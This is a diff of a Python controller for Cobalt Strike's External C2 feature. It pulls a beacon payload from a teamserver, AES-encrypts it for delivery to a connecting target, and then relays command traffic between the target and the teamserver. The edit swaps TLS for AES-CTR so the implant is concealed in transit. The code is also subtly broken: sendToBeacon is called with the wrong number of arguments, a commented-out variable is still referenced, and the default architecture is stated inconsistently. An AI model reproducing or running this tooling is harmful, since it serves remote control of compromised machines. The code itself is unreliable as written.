@@ -4,20 +4,22 @@
     Program to provide basic TCP communications for Cobalt Strike using the External C2 feature.
 """
 import argparse
-import base64
 import ipaddress
 import socket
 import struct
 import sys
 import time
-import wolfssl
+from base64 import b64encode
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+from Crypto.Random import get_random_bytes
 
 
 class TCPinfo:
     """
     @brief Class to hold info for TCP session
     """
-    def __init__(self, ts_ip, ts_port, srv_ip, srv_port, pipe_str, cert, key):
+    def __init__(self, ts_ip, ts_port, srv_ip, srv_port, pipe_str, key):
         """
 
         :param ts_ip: IP address of CS Teamserver
@@ -25,8 +27,7 @@ class TCPinfo:
         :param srv_ip: IP to bind to on server
         :param srv_port: Port of server to listen on
         :param pipe_str: String for named pipe on client
-        :param cert: Path to server pem cert
-        :param key: Path to server pem key
+        :param key: AES key to encrypt comms
         """
         if len(pipe_str) > 50:
             raise ValueError('pipe_str must be less than 50 characters')
@@ -35,7 +36,6 @@ class TCPinfo:
         self.srv_ip = srv_ip
         self.srv_port = srv_port
         self.pipe_str = pipe_str
-        self.cert = cert
         self.key = key
         
 
@@ -83,29 +83,29 @@ class ExternalC2Controller:
             data += self._socketTS.recv(frame_length - len(data))
         return data
 
-    def sendToBeacon(self, secure_sock, data):
+    def sendToBeacon(self, tcpinfo, data):
         """
         
-        :param secure_sock: TLS Socket
+        :param tcpinfo: Class with user tcp info
         :param data: Data to send to beacon
         """
         frame = self.encode_frame(data)
         try:
-            secure_sock.sendall(frame)
+            self._socketBeacon.sendall(frame)
         except Exception as e:
             print("sendall() in sendToBeacon failed. Error: {}".format(e))
             return -1
         return None
 
 
-    def recvFromBeacon(self, secure_sock):
+    def recvFromBeacon(self, tcpinfo):
         """
 
-        :param secure_sock: TLS Socket
+        :param tcpinfo: Class with user TCP info
         :return: data received from beacon
         """
         try:
-            data_length = secure_sock.recv(4)
+            data_length = self._socketBeacon.recv(4)
         except:
             print("Recv failed.")
             return -1
@@ -119,7 +119,7 @@ class ExternalC2Controller:
         data = b''
         while (total < length):
             try:
-                temp = secure_sock.recv(length-total)
+                temp = self._socketBeacon.recv(length-total)
             except Exception as e:
                 print("Recv data in recvFromBeacon failed. Error: {}".format(e))
                 return -1
@@ -150,41 +150,34 @@ class ExternalC2Controller:
         self.send_to_ts("go".encode())
 
         # Receive the beacon payload from CS to forward to our target
-        data = self.recv_from_ts()
+        payload = self.recv_from_ts()
 
         # Now that we have our beacon to send, wait for a connection from our target
         self._socketServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self._socketServer.bind((tcpinfo.srv_ip,tcpinfo.srv_port))
         self._socketServer.listen()
-
-        print("cert: {}".format(tcpinfo.cert))
-        print("key: {}".format(tcpinfo.key))
-        wolfssl.WolfSSL.enable_debug()
-        #context = wolfssl.SSLContext(wolfssl.PROTOCOL_TLSv1_2, server_side=True)
-        context = wolfssl.SSLContext(wolfssl.PROTOCOL_TLSv1_2, server_side=True)
-        context.load_cert_chain(tcpinfo.cert, tcpinfo.key)
-        context.verify_mode = wolfssl.CERT_NONE
-        secure_sock = None
-        print("HERE")
-
         self._socketBeacon, beacon_addr = self._socketServer.accept()
         print("Connected to : {}".format(beacon_addr))
-        secure_sock = context.wrap_socket(self._socketBeacon)
-        # Send beacon payload to target
-        self.sendToBeacon(secure_sock, data)
-        current_beacon_ip = beacon_addr[0]
 
+        # Send iv and encrypted beacon payload to target
+        cipher = AES.new((tcpinfo.key).encode(), AES.MODE_CTR)
+        ct_bytes = cipher.encrypt(payload)
+        nonce = b64encode(cipher.nonce)
+        ct = b64encode(ct_bytes)
+        self.sendToBeacon(nonce)
+        self.sendToBeacon(ct)
+        
+        #current_beacon_ip = beacon_addr[0]
+
+        print("Start pipe dance")
         while True:
 
-            data = self.recvFromBeacon(secure_sock)
+            data = self.recvFromBeacon(tcpinfo)
             if data == None:
                 '''
                 print("Disconnected from beacon, likely due to sleep.")
-                secure_sock.close()
-                secure_sock = None
                 self._socketBeacon, beacon_addr = self._socketServer.accept()
                 print("Connected to : {}".format(beacon_addr))
-                secure_sock = context.wrap_socket(self._socketBeacon)
                 if current_beacon_ip == beacon_addr[0]:
                     continue
                 else:
@@ -201,9 +194,8 @@ class ExternalC2Controller:
 
             data = self.recv_from_ts()
             print("Received {} bytes from TS and sending to beacon".format(len(data)))
-            if (self.sendToBeacon(secure_sock, data) == -1):
+            if (self.sendToBeacon(tcpinfo, data) == -1):
                 break
-        secure_sock.close()
         self._socketBeacon.close()
         self._socketServer.close()
         self._socketTS.close()
@@ -211,20 +203,19 @@ class ExternalC2Controller:
 
 parser = argparse.ArgumentParser(description='Program to provide TCP communications for Cobalt Strike using the External C2 feature.',
                                  usage="\n"
-                                       "%(prog)s [TS_IP] [SRV_IP] [SRV_PORT] [PIPE_STR] [CERT] [KEY]"
+                                       "%(prog)s [TS_IP] [SRV_IP] [SRV_PORT] [PIPE_STR] [KEY]"
                                        "\nUse '%(prog)s -h' for more information.")
 parser.add_argument('ts_ip', help="IP of teamserver (or redirector).")
 parser.add_argument('srv_ip', help="IP to bind to on server.")
 parser.add_argument('srv_port', type=int, help="Port number to bind to on server.")
 parser.add_argument('pipe_str', help="String to name the pipe to the beacon. It must be the same as the client.")
-parser.add_argument('cert', help="Path to servers cert. (PEM format)")
-parser.add_argument('key', help="Path to servers key. (PEM format)")
+parser.add_argument('key', help="AES key to encrypt the beacon that is initially sent. It must be the same as the client.")
 parser.add_argument('--teamserver_port', '-tp', default=2222, type=int, help="Customize the port used to connect to the teamserver. Default is 2222.")
 parser.add_argument('--restart', '-r', default="N", help="Sleep 10s then restart the server after a disconnect or exit (Y/N). Default is N.")
 parser.add_argument('--arch', '-a', choices=['x86', 'x64'], default='x64', type=str, help="Architecture to use for beacon. x86 or x64. Default is x86.")
 args = parser.parse_args()
 controller = ExternalC2Controller(args.teamserver_port)
-tcpinfo = TCPinfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str, args.cert, args.key)
+tcpinfo = TCPinfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str, args.key)
 while True:
     if(args.arch == 'x64'):
         print('Ensure client is x64!')
